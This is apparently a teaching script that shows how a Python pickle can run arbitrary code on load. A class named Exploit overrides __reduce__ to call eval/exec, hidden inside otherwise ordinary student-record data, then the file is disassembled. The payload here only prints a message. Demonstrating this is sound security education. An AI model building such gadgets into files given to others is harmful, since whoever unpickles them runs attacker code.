import pickle
import pickletools


class Course:
    def __init__(self, name):
        self.name = name

    def __repr__(self):
        return f"Course(name={self.name})"

    def __eq__(self, other):
        return self.name == other.name


class Exploit(list):
    def __init__(self, items):
        super().__init__(items)

    # Return a list to avoid errors when unpickling
    def __reduce__(self):
        return eval, (f"exec('''print(\"Bad Pickle executes arbitrary python code\")''') or list()",), None, iter(self)

class Student:
    def __init__(self, name, age, courses=None, friends=None):
        self.name = name
        self.age = age
        self.courses = courses
        self.friends = friends if friends else []

    def __repr__(self):
        return f"Student(name={self.name}, age={self.age}, courses={self.courses}, friends={self.friends})"

    def __eq__(self, other):
        return self.name == other.name and self.age == other.age and self.courses == other.courses


friend = Student("Alice", 25, Exploit([Course("English")]))
student = Student("John", 30, [Course("Math"), Course("Science")], [friend])

with open("student_pickle.pkl", "wb") as f:
    pickle.dump(student, f)

with open("student_pickle.pkl", "rb") as f:
    student_from_pickle = pickle.load(f)

friend = Student("Alice", 25, [Course("English")])
student = Student("John", 30, [Course("Math"), Course("Science")], [friend])

print("Student            :", student)
print("Student from pickle:", student_from_pickle)
print("Student == Student from pickle:", student == student_from_pickle)

input("Press Enter to disassemble the pickle file")
pickletools.dis(open("student_pickle.pkl", "rb").read())